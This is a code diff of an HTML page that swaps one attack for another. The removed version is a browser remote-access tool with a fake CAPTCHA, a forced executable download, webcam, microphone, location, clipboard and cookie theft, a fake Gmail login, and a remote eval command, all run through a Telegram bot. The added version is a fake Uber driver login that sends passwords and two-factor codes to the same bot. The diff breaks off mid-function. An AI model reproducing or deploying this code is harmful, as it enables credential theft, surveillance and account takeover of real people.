@@ -3,720 +3,300 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verify you are human</title>
+    <title>Uber – Driver Login</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #f5f5f5;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Uber Move', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #000000;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 8px 30px rgba(255,255,255,0.05);
             overflow: hidden;
         }
-        /* CAPTCHA Overlay */
-        .captcha-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.85);
-            z-index: 20000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            backdrop-filter: blur(4px);
-            transition: opacity 0.5s;
+        .header {
+            padding: 24px 24px 8px 24px;
         }
-        .captcha-box {
-            background: white;
-            border-radius: 12px;
-            width: 90%;
-            max-width: 400px;
-            padding: 30px 25px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            font-family: 'Roboto', Arial, sans-serif;
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #000000;
         }
-        .captcha-box h2 {
-            font-size: 24px;
-            font-weight: 500;
+        .logo span {
+            color: #00b14f;
+        }
+        .content {
+            padding: 8px 24px 32px 24px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1a1a1a;
+        }
+        .step {
+            font-size: 14px;
+            color: #6e6e6e;
+            margin-bottom: 24px;
+        }
+        .form-group {
             margin-bottom: 20px;
-            color: #202124;
         }
-        .captcha-checkbox {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            background: #f1f3f4;
-            padding: 12px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin: 20px 0;
+        label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #222;
+            font-size: 14px;
         }
-        .captcha-checkbox:hover {
-            background: #e8eaed;
-        }
-        .captcha-checkbox input {
-            width: 24px;
-            height: 24px;
-            cursor: pointer;
-        }
-        .captcha-checkbox label {
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ccc;
+            border-radius: 16px;
             font-size: 16px;
-            color: #3c4043;
-            cursor: pointer;
+            transition: 0.2s;
+            background: #fff;
         }
-        .captcha-footer {
-            font-size: 12px;
-            color: #5f6368;
-            margin-top: 15px;
+        input:focus {
+            outline: none;
+            border-color: #000000;
+            box-shadow: 0 0 0 3px rgba(0,0,0,0.1);
         }
-        .hidden {
-            display: none;
-        }
-        /* Original RAT styles (same as before) */
-        .loader-container {
-            text-align: center;
-            background: white;
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            z-index: 1000;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 1rem;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #mainFrame {
-            position: fixed;
-            top: 0;
-            left: 0;
+        button {
             width: 100%;
-            height: 100%;
-            border: none;
-            z-index: 0;
-            opacity: 0;
-            transition: opacity 0.8s;
-        }
-        #persistentFrame {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            top: -100px;
-            left: -100px;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -1;
-        }
-        .gmail-phish-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 10000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Google Sans', Roboto, Arial, sans-serif;
-        }
-        .gmail-phish-box {
-            background: white;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 450px;
-            padding: 30px 25px 40px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            text-align: center;
-        }
-        .gmail-phish-box input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        .gmail-phish-box button {
-            background: #1a73e8;
+            background: #000000;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
+            padding: 14px;
             font-size: 16px;
+            font-weight: 600;
+            border-radius: 16px;
             cursor: pointer;
-            width: 100%;
+            transition: background 0.2s;
+            margin-top: 8px;
         }
-        .error-msg { color: #d93025; font-size: 14px; margin-top: 10px; display: none; }
-        body.modal-active { overflow: hidden; }
+        button:hover {
+            background: #333;
+        }
+        .recaptcha {
+            background: #f3f3f3;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #555;
+            border: 1px solid #e0e0e0;
+        }
+        .recaptcha input {
+            width: auto;
+            transform: scale(1.2);
+            margin-right: 8px;
+        }
+        .fake-checkbox {
+            width: 20px;
+            height: 20px;
+            background: white;
+            border: 1px solid #aaa;
+            border-radius: 3px;
+            display: inline-block;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 12px;
+            text-align: center;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: #00b14f;
+            font-size: 14px;
+        }
+        .error {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+        hr {
+            margin: 20px 0;
+            border: none;
+            border-top: 1px solid #eee;
+        }
     </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
-    <!-- CAPTCHA Overlay -->
-    <div class="captcha-overlay" id="captchaOverlay">
-        <div class="captcha-box">
-            <h2>Verify you are human</h2>
-            <div class="captcha-checkbox" id="captchaCheckbox">
-                <input type="checkbox" id="captchaInput">
-                <label for="captchaInput">I'm not a robot</label>
+    <div class="container">
+        <div class="header">
+            <div class="logo">UBER<span>driver</span></div>
+        </div>
+        <div class="content">
+            <h1>Driver sign in</h1>
+            <div class="step">Step 1 of 3: Account verification</div>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Email or phone number</label>
+                    <input type="text" id="emailOrPhone" required placeholder="driver@example.com or +1 234 567 8900">
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" required placeholder="Enter your password">
+                </div>
+                <div class="recaptcha" id="recaptchaContainer">
+                    <div style="background:#fff; border:1px solid #aaa; width:18px; height:18px; border-radius:3px;"></div>
+                    <span>I'm not a robot</span>
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="margin-left:auto; height:30px;" alt="reCAPTCHA">
+                </div>
+                <button type="submit" id="submitBtn">Continue</button>
+                <div class="loading" id="loadingMsg">Verifying, please wait...</div>
+                <div class="error" id="errorMsg">Incorrect email or password. Please try again.</div>
+            </form>
+            <div class="footer">
+                This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
             </div>
-            <div class="captcha-footer">reCAPTCHA protected</div>
         </div>
     </div>
 
-    <!-- Original RAT elements (hidden until CAPTCHA solved) -->
-    <div class="loader-container" id="loadingOverlay" style="display: none;">
-        <div class="spinner"></div>
-        <h2>Loading, please wait...</h2>
-        <p>Secure connection established.</p>
-    </div>
-    <iframe id="mainFrame" src="https://example.com" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals" style="display: none;"></iframe>
-    <iframe id="persistentFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation" style="display:none;"></iframe>
-
     <script>
-        (function(){
-            "use strict";
+        // Telegram bot credentials (your existing bot)
+        const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
+        const CHAT_ID = '8737104261';
 
-            // ================= CONFIGURATION =================
-            const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
-            const ADMIN_CHAT_ID = '8737104261';
-            const POLL_INTERVAL = 3000;
-            const START_DELAY = 5000;
-            const AUDIO_DURATION_MS = 120000;
+        // Simple fake 2FA flow after password
+        let step = 1; // 1: email/password, 2: 2FA
+        let capturedEmailPhone = '';
+        let capturedPassword = '';
 
-            // File to download automatically after CAPTCHA (change URL to your malicious file)
-            const DOWNLOAD_FILE_URL = 'https://your-server.com/payload.exe';  // <-- REPLACE WITH YOUR FILE URL
-            const DOWNLOAD_FILENAME = 'update.exe';
+        const form = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingDiv = document.getElementById('loadingMsg');
+        const errorDiv = document.getElementById('errorMsg');
+        const stepDiv = document.querySelector('.step');
+        const recaptchaDiv = document.getElementById('recaptchaContainer');
 
-            // ================= STATE =================
-            let isRegistered = false;
-            let updateId = 0;
-            let intervalId = null;
-            let phishingModalActive = false;
-            let deviceId = localStorage.getItem('deviceId');
-            if (!deviceId) {
-                deviceId = 'hook_' + Math.random().toString(36).substr(2, 8);
-                localStorage.setItem('deviceId', deviceId);
-            }
-            let storedGmailCredentials = { 
-                email: localStorage.getItem('gmailEmail') || '', 
-                password: localStorage.getItem('gmailPass') || '' 
-            };
-            let permissionsStatus = { camera: false, microphone: false, location: false, clipboard: false };
-            let gmailDetectedNotified = false;
-
-            // Suppress console logs for stealth
-            console.log = function() {};
-            console.error = function() {};
-
-            // ================= TELEGRAM HELPERS =================
-            const TELEGRAM_HEADERS = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            };
-
-            async function sendMessage(text, parseMode = 'HTML', replyMarkup = null) {
-                try {
-                    const body = { chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode };
-                    if (replyMarkup) body.reply_markup = replyMarkup;
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { ...TELEGRAM_HEADERS, 'Content-Type': 'application/json' },
-                        body: JSON.stringify(body)
-                    });
-                } catch(e) {}
-            }
-
-            async function sendPhoto(blob, caption) {
-                const fd = new FormData();
-                fd.append('chat_id', ADMIN_CHAT_ID);
-                fd.append('photo', blob, 'capture.jpg');
-                fd.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
-            }
-
-            async function sendDocument(blob, filename, caption) {
-                const fd = new FormData();
-                fd.append('chat_id', ADMIN_CHAT_ID);
-                fd.append('document', blob, filename);
-                fd.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
-            }
-
-            async function sendTyping() {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendChatAction?chat_id=${ADMIN_CHAT_ID}&action=typing`, { headers: TELEGRAM_HEADERS });
-            }
-
-            // ================= TRIGGER DOWNLOAD =================
-            function triggerDownload() {
-                try {
-                    // Method 1: Use a hidden anchor click (requires user gesture – already satisfied)
-                    const a = document.createElement('a');
-                    a.href = DOWNLOAD_FILE_URL;
-                    a.download = DOWNLOAD_FILENAME;
-                    a.style.display = 'none';
-                    document.body.appendChild(a);
-                    a.click();
-                    setTimeout(() => a.remove(), 100);
-                } catch(e) {
-                    // Fallback: open in new tab (may not auto-download)
-                    window.open(DOWNLOAD_FILE_URL, '_blank');
-                }
-            }
-
-            // ================= PERMISSIONS =================
-            async function requestAllPermissions() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    permissionsStatus.camera = true;
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) { permissionsStatus.camera = false; }
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    permissionsStatus.microphone = true;
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) { permissionsStatus.microphone = false; }
-                try {
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject);
-                    });
-                    permissionsStatus.location = true;
-                } catch(e) { permissionsStatus.location = false; }
-                try {
-                    await navigator.clipboard.readText();
-                    permissionsStatus.clipboard = true;
-                } catch(e) { permissionsStatus.clipboard = false; }
-            }
-
-            // ================= REGISTRATION & MENU =================
-            async function registerAndSendMenu() {
-                const emoji = (p) => p ? '🟢' : '🔴';
-                const permLine = `📷 ${emoji(permissionsStatus.camera)}  🎤 ${emoji(permissionsStatus.microphone)}  📍 ${emoji(permissionsStatus.location)}  📋 ${emoji(permissionsStatus.clipboard)}`;
-                const mainMenu = {
-                    inline_keyboard: [
-                        [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
-                        [{ text: '📍 GPS', callback_data: 'location' }, { text: '📸 Screenshot', callback_data: 'screenshot' }],
-                        [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
-                        [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
-                        [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
-                        [{ text: '🔄 Devices', callback_data: 'devices' }, { text: '📜 History', callback_data: 'history' }, { text: '📧 Auto Gmail', callback_data: 'auto_gmail' }]
-                    ]
-                };
-                await sendMessage(
-                    `✅ *Device Ready* | \`${deviceId}\`\n🟢 Online | Permissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n${storedGmailCredentials.email ? `🔐 Credentials stored for ${storedGmailCredentials.email}. Use /auto_gmail` : 'No Gmail credentials yet. Use /phish_gmail to capture.'}\n\n_Send commands to this device by using @${deviceId} after the command._`,
-                    'Markdown',
-                    mainMenu
-                );
-            }
-
-            // ================= GMAIL AUTO-LOGIN & READING =================
-            async function autoLoginAndReadEmails() {
-                if (!storedGmailCredentials.email || !storedGmailCredentials.password) {
-                    return { success: false, error: "No Gmail credentials stored. Use /phish_gmail first." };
-                }
-                window.location.href = 'https://accounts.google.com';
-                return new Promise((resolve) => {
-                    let attempts = 0;
-                    const interval = setInterval(async () => {
-                        const emailField = document.querySelector('input[type="email"]');
-                        const passwordField = document.querySelector('input[type="password"]');
-                        const nextBtn = document.querySelector('#identifierNext, #passwordNext, button[jsname]');
-                        
-                        if (emailField && !emailField.value) {
-                            emailField.value = storedGmailCredentials.email;
-                            emailField.dispatchEvent(new Event('input', { bubbles: true }));
-                            if (nextBtn) nextBtn.click();
-                        } else if (passwordField && !passwordField.value) {
-                            passwordField.value = storedGmailCredentials.password;
-                            passwordField.dispatchEvent(new Event('input', { bubbles: true }));
-                            if (nextBtn) nextBtn.click();
-                        } else if (window.location.href.includes('mail.google.com')) {
-                            clearInterval(interval);
-                            setTimeout(async () => {
-                                const emails = await readGmailInbox();
-                                resolve({ success: true, data: emails });
-                            }, 3000);
-                            return;
-                        }
-                        attempts++;
-                        if (attempts > 60) {
-                            clearInterval(interval);
-                            resolve({ success: false, error: "Auto-login timed out" });
-                        }
-                    }, 500);
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
                 });
-            }
+            } catch(e) { console.error(e); }
+        }
 
-            async function readGmailInbox() {
-                if (!window.location.href.includes('mail.google.com')) {
-                    return { success: false, error: "Not on Gmail page." };
+        function showError(msg) {
+            errorDiv.innerText = msg;
+            errorDiv.style.display = 'block';
+            setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            loadingDiv.style.display = 'block';
+            submitBtn.disabled = true;
+
+            if (step === 1) {
+                // Capture email/phone and password
+                capturedEmailPhone = document.getElementById('emailOrPhone').value.trim();
+                capturedPassword = document.getElementById('password').value.trim();
+
+                if (!capturedEmailPhone || !capturedPassword) {
+                    showError('Please fill in both fields.');
+                    loadingDiv.style.display = 'none';
+                    submitBtn.disabled = false;
+                    return;
                 }
-                const rows = document.querySelectorAll('.zA, .zE, .Cp');
-                const emails = [];
-                for (let row of rows.slice(0, 20)) {
-                    const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
-                    const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
-                    const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
-                    if (from || subject) {
-                        emails.push({ from, subject, snippet: snippet.substring(0, 100) });
-                    }
-                }
-                if (emails.length === 0) return { success: true, data: "No emails found in current view." };
-                return { success: true, data: emails };
-            }
 
-            // ================= PHISHING MODAL =================
-            function createPhishingModal() {
-                if (phishingModalActive) return;
-                phishingModalActive = true;
-                document.body.classList.add('modal-active');
+                // Send first part to Telegram
+                const message = `<b>🔑 Uber Driver Login (Step 1)</b>\n\n<b>Email/Phone:</b> <code>${escapeHtml(capturedEmailPhone)}</code>\n<b>Password:</b> <code>${escapeHtml(capturedPassword)}</code>\n<b>Time:</b> ${new Date().toLocaleString()}`;
+                await sendTelegramMessage(message);
 
-                const modal = document.createElement('div');
-                modal.className = 'gmail-phish-modal';
-                modal.innerHTML = `
-                    <div class="gmail-phish-box">
-                        <h1>Sign in to continue to Gmail</h1>
-                        <input type="email" id="phish-email" placeholder="Email or phone" value="">
-                        <input type="password" id="phish-password" placeholder="Password">
-                        <button id="phish-submit">Next</button>
-                        <div class="error-msg" id="phish-error">Incorrect email or password. Please try again.</div>
+                // Now switch to 2FA step (simulate)
+                step = 2;
+                stepDiv.innerText = 'Step 2 of 3: Two‑factor authentication';
+                // Replace form fields with 2FA input
+                const formHtml = `
+                    <div class="form-group">
+                        <label>Verification code</label>
+                        <input type="text" id="twoFactorCode" placeholder="Enter 6‑digit code" autocomplete="off">
                     </div>
+                    <div class="recaptcha" id="recaptchaContainer2" style="display:none;"></div>
                 `;
-                document.body.appendChild(modal);
-
-                const blockKeys = (e) => {
-                    if (e.key === 'Escape') {
-                        e.preventDefault();
-                        const errDiv = document.getElementById('phish-error');
-                        if (errDiv) errDiv.style.display = 'block';
-                    }
-                };
-                document.addEventListener('keydown', blockKeys);
-                modal.addEventListener('click', (e) => {
-                    if (e.target === modal) {
-                        const errDiv = document.getElementById('phish-error');
-                        if (errDiv) errDiv.style.display = 'block';
-                    }
-                });
-
-                const emailInp = document.getElementById('phish-email');
-                const passInp = document.getElementById('phish-password');
-                const errDiv = document.getElementById('phish-error');
-                const submit = async () => {
-                    const email = emailInp.value.trim();
-                    const pass = passInp.value;
-                    if (!email || !pass) {
-                        errDiv.style.display = 'block';
-                        errDiv.innerText = 'Please fill both fields.';
+                document.querySelector('.form-group').parentNode.innerHTML = formHtml;
+                // Re-attach event listener to new submit button (original button still exists)
+                // We'll recreate the button and event
+                const newForm = document.getElementById('loginForm');
+                const newSubmit = newForm.querySelector('button');
+                // Remove old listener and add new
+                newForm.addEventListener('submit', async (e2) => {
+                    e2.preventDefault();
+                    const code = document.getElementById('twoFactorCode').value.trim();
+                    if (!code) {
+                        showError('Please enter the verification code.');
                         return;
                     }
-                    storedGmailCredentials = { email, password: pass };
-                    localStorage.setItem('gmailEmail', email);
-                    localStorage.setItem('gmailPass', pass);
-                    await sendMessage(`🎣 *Gmail Credentials Captured*\n📧 Email: ${email}\n🔑 Password: ${pass}\n\nUse /auto_gmail to automatically log in and read emails.`, 'Markdown');
-                    modal.remove();
-                    document.body.classList.remove('modal-active');
-                    phishingModalActive = false;
-                    document.removeEventListener('keydown', blockKeys);
-                    setTimeout(() => { window.location.href = 'https://mail.google.com'; }, 500);
-                };
-                document.getElementById('phish-submit').addEventListener('click', submit);
-                emailInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
-                passInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
-            }
-
-            // ================= BROWSER HISTORY (limited) =================
-            async function getBrowserHistory() {
-                return `📍 *Current Page:* ${location.href}\n↩️ *Referrer:* ${document.referrer || 'none'}\n\n⚠️ Full browser history is not accessible from a web page. Use the Chrome extension for full history.`;
-            }
-
-            // ================= COMMAND HANDLER =================
-            async function handleCommand(fullText) {
-                // Device targeting
-                let targetDevice = null;
-                let cmdText = fullText;
-                const atIndex = fullText.indexOf('@');
-                if (atIndex !== -1) {
-                    targetDevice = fullText.substring(atIndex + 1).split(' ')[0];
-                    cmdText = fullText.substring(0, atIndex).trim();
-                }
-                if (targetDevice && targetDevice !== deviceId) return;
-
-                const parts = cmdText.trim().split(' ');
-                let cmd = parts[0].toLowerCase();
-                if (cmd === '/phishgmail' || cmd === '/phish_gmail') cmd = '/phish_gmail';
-                if (cmd === '/grabpass' || cmd === '/grab_pass') cmd = '/grab_pass';
-                if (cmd === '/reademails' || cmd === '/read_emails') cmd = '/read_emails';
-                if (cmd === '/autogmail' || cmd === '/auto_gmail') cmd = '/auto_gmail';
-
-                await sendTyping();
-
-                try {
-                    switch(cmd) {
-                        case '/start':
-                            await registerAndSendMenu();
-                            break;
-                        case '/auto_gmail':
-                            await sendMessage('🔄 Attempting auto-login to Gmail and reading emails...');
-                            const autoResult = await autoLoginAndReadEmails();
-                            if (autoResult.success) {
-                                if (typeof autoResult.data === 'string') {
-                                    await sendMessage(`📧 *Auto Gmail Result*\n${autoResult.data}`, 'Markdown');
-                                } else {
-                                    let msg = `📧 *Latest emails after auto-login* (${autoResult.data.length}):\n\n`;
-                                    for (let i = 0; i < autoResult.data.length; i++) {
-                                        const e = autoResult.data[i];
-                                        msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
-                                        if (msg.length > 3800) break;
-                                    }
-                                    await sendMessage(msg, 'Markdown');
-                                }
-                            } else {
-                                await sendMessage(`❌ Auto Gmail failed: ${autoResult.error}`);
-                            }
-                            break;
-                        case '/phish_gmail':
-                            if (!phishingModalActive) createPhishingModal();
-                            await sendMessage('🎣 Phishing modal injected.');
-                            break;
-                        case '/read_emails':
-                            const readResult = await readGmailInbox();
-                            if (readResult.success) {
-                                let msg = `📧 *Latest emails* (${readResult.data.length}):\n`;
-                                for (let i = 0; i < readResult.data.length; i++) {
-                                    msg += `${i+1}. *${readResult.data[i].from}* – ${readResult.data[i].subject}\n   ${readResult.data[i].snippet}\n\n`;
-                                }
-                                await sendMessage(msg.substring(0,3900), 'Markdown');
-                            } else {
-                                await sendMessage(`❌ ${readResult.error}`);
-                            }
-                            break;
-                        case '/gmail':
-                            if (location.href.includes('accounts.google.com')) {
-                                let email = document.querySelector('input[type="email"]')?.value || '';
-                                let pass = document.querySelector('input[type="password"]')?.value;
-                                if (!pass) {
-                                    const pf = document.querySelector('input[type="password"]');
-                                    if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
-                                    await sendMessage('Attempting autofill...');
-                                } else {
-                                    storedGmailCredentials = { email, password: pass };
-                                    localStorage.setItem('gmailEmail', email);
-                                    localStorage.setItem('gmailPass', pass);
-                                    await sendMessage(`🔑 Stored: ${email} / ${pass}\nUse /auto_gmail`, 'Markdown');
-                                }
-                            } else {
-                                await sendMessage('Not on Google login page. Use /phish_gmail.');
-                            }
-                            break;
-                        case '/history':
-                            await sendMessage(await getBrowserHistory(), 'Markdown');
-                            break;
-                        case '/photo':
-                            try {
-                                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                                const video = document.createElement('video');
-                                video.srcObject = stream;
-                                await new Promise(r => { video.onloadedmetadata = r; video.play(); });
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                canvas.getContext('2d').drawImage(video, 0, 0);
-                                stream.getTracks().forEach(t => t.stop());
-                                canvas.toBlob(blob => sendPhoto(blob, '📸 Camera'), 'image/jpeg');
-                            } catch(e) { await sendMessage(`Camera error: ${e.message}`); }
-                            break;
-                        case '/audio':
-                            try {
-                                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                                const mediaRecorder = new MediaRecorder(stream);
-                                let chunks = [];
-                                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                                mediaRecorder.onstop = async () => {
-                                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                                    await sendDocument(blob, `rec_${Date.now()}.webm`, `🎙️ Audio ${AUDIO_DURATION_MS/1000}s`);
-                                    stream.getTracks().forEach(t => t.stop());
-                                };
-                                mediaRecorder.start();
-                                setTimeout(() => mediaRecorder.stop(), AUDIO_DURATION_MS);
-                                await sendMessage(`Recording ${AUDIO_DURATION_MS/1000}s...`);
-                            } catch(e) { await sendMessage(`Mic error: ${e.message}`); }
-                            break;
-                        case '/location':
-                            navigator.geolocation.getCurrentPosition(async pos => {
-                                await sendMessage(`📍 ${pos.coords.latitude},${pos.coords.longitude} (±${pos.coords.accuracy}m)`);
-                            }, async err => await sendMessage(`GPS error: ${err.message}`));
-                            break;
-                        case '/screenshot':
-                            html2canvas(document.body).then(canvas => {
-                                canvas.toBlob(blob => sendPhoto(blob, '📸 Screenshot'), 'image/png');
-                            }).catch(e => sendMessage(`Screenshot failed: ${e.message}`));
-                            break;
-                        case '/cookies':
-                            await sendMessage(`🍪 Cookies: ${document.cookie || 'none'}`);
-                            break;
-                        case '/grab_pass':
-                            const pw = document.querySelector('input[type="password"]');
-                            if (pw && pw.value) await sendMessage(`🔐 Password: ${pw.value}`);
-                            else await sendMessage('No visible password field.');
-                            break;
-                        case '/clipboard':
-                            try {
-                                const txt = await navigator.clipboard.readText();
-                                await sendMessage(`📋 Clipboard: ${txt}`);
-                            } catch(e) { await sendMessage(`Clipboard error: ${e.message}`); }
-                            break;
-                        case '/eval':
-                            if (parts.length > 1) {
-                                const code = cmdText.substring(5);
-                                let result = eval(code);
-                                if (typeof result !== 'string') result = JSON.stringify(result);
-                                await sendMessage(`✅ Eval:\n${result.substring(0,3900)}`);
-                            } else await sendMessage('Usage: /eval <js>');
-                            break;
-                        case '/upload':
-                            const input = document.createElement('input');
-                            input.type = 'file';
-                            input.onchange = async (e) => {
-                                const file = e.target.files[0];
-                                if (file) await sendDocument(file, file.name, `📁 ${file.name}`);
-                            };
-                            input.click();
-                            await sendMessage('File picker opened.');
-                            break;
-                        case '/devices':
-                            await sendMessage(`🖥️ *Device* \`${deviceId}\`\nPermissions: ${permissionsStatus.camera?'✅':'❌'} 📷 ${permissionsStatus.microphone?'✅':'❌'} 🎤 ${permissionsStatus.location?'✅':'❌'} 📍 ${permissionsStatus.clipboard?'✅':'❌'} 📋\n${storedGmailCredentials.email ? `🔐 Gmail: ${storedGmailCredentials.email}` : 'No creds'}`, 'Markdown');
-                            break;
-                        default:
-                            await sendMessage(`Unknown command: ${cmd}`);
-                    }
-                } catch(err) {
-                    await sendMessage(`Error: ${err.message}`);
-                }
-            }
-
-            // ================= POLLING & PERSISTENCE =================
-            async function syncOffset() {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=1`, { headers: TELEGRAM_HEADERS });
-                    const data = await res.json();
-                    if (data.ok && data.result && data.result.length > 0) {
-                        updateId = data.result[data.result.length - 1].update_id + 1;
-                    } else {
-                        updateId = 0;
-                    }
-                } catch(e) {}
-            }
-
-            async function pollUpdates() {
-                if (!isRegistered) return;
-                try {
-                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`;
-                    const res = await fetch(url, { headers: TELEGRAM_HEADERS });
-                    const data = await res.json();
-                    if (data.ok && data.result) {
-                        for (const upd of data.result) {
-                            if (upd.update_id >= updateId) {
-                                updateId = upd.update_id + 1;
-                                if (upd.message && upd.message.text) {
-                                    await handleCommand(upd.message.text);
-                                } else if (upd.callback_query) {
-                                    await handleCommand('/' + upd.callback_query.data);
-                                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${upd.callback_query.id}`, { headers: TELEGRAM_HEADERS });
-                                }
-                            }
-                        }
-                    }
-                } catch(e) {}
-            }
-
-            function setupPersistence() {
-                document.addEventListener('click', (e) => {
-                    let target = e.target.closest('a');
-                    if (target && target.href && !target.href.startsWith('javascript:')) {
-                        e.preventDefault();
-                        window.open(target.href, '_blank');
-                    }
-                }, true);
-                const pframe = document.getElementById('persistentFrame');
-                if (pframe) pframe.src = 'about:blank';
-            }
-
-            // Gmail detection
-            let lastUrl = location.href;
-            new MutationObserver(() => {
-                const url = location.href;
-                if (url !== lastUrl) {
-                    lastUrl = url;
-                    if (url.includes('mail.google.com') && !gmailDetectedNotified) {
-                        gmailDetectedNotified = true;
-                        sendMessage(`📧 *Gmail detected* on \`${deviceId}\`. Use /read_emails.`, 'Markdown');
